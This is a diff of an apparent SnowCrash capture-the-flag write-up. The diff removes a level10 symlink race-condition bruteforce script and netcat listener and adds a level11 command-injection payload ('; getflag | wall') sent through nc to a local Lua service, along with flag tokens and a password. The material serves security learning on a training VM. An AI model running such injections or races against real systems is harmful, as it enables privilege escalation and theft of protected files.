@@ -77,52 +77,20 @@ Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
 level11@SnowCrash:~$ echo '; getflag > /tmp/Gabe ; echo' | nc localhost 6969 && cat /tmp/Gabe
 Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
 
-# OOPS this did not work. when I enter the password it did not work
+# Below is another method for solving the same problem.
+level11@SnowCrash:~$ echo '; getflag | wall' | nc localhost 5151
 
-# 	Okay but it wasn't a complete waste and we show that we are on the correct path and we need to use port 6969 instead
+Broadcast Message from flag11@Snow
+        (somewhere) at 9:14 ...
 
-We decompile on an online tool, and we realize that there is a race condition: If between the call to access and the call to open, 
-the file named by argv [1] changes, we can read an arbitrary file.
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
 
-# So we open a shell on which we listen in loop with the following command:
-#	while [42]; do nc-1 6969; therefore
+Erf nope..
 
-vim listener.sh
-
-#!/bin/sh
-while [ 42 ] ; do nc -l 6969; done
-
-# We create a shell script that will try to bruteforce this race condition: It will call the binary between two calls to ln to try to 
-#	change the symbolic link running. We see the following password in our second shell:
-
-vim bruteForce.sh
-#!/bin/sh
-touch /tmp/gabe
-  while true; do
-       ln -sf /tmp/gabe /tmp/copyToken  &
-       /home/user/level10/level10 /tmp/copyToken 127.0.0.1 &
-       ln -sf /home/user/level10/token /tmp/copyToken &
-  done
-
-# Note you will need 2 terminals conntected to the ssh level10@192.168.56.101 -p 4242
-# 	Run the listener.sh first on the one.
-#		On the other run bruteforce.sh
-#	once you see the below then stop the listener.sh with control c
-
-.*( )*.
-woupa2yuojeeaaed06riuj63c
-.*( )*.
-^C
-
-# The above is your password for the flag10
-
-level10@SnowCrash:~$ su flag10
-Password: woupa2yuojeeaaed06riuj63c
-Don't forget to launch getflag !
-flag10@SnowCrash:~$ getflag
-Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+# We completely by passed the flag here and got it without cracking it but through an echo exploit that I used in 10 and it wasn't the correct.
+	But it worked for this level11 
 
 
 Resources
 http://pgl.yoyo.org/luai/i/io.popen
-
+https://stackoverflow.com/questions/5239317/io-popen-how-to-wait-for-process-to-finish-in-lua
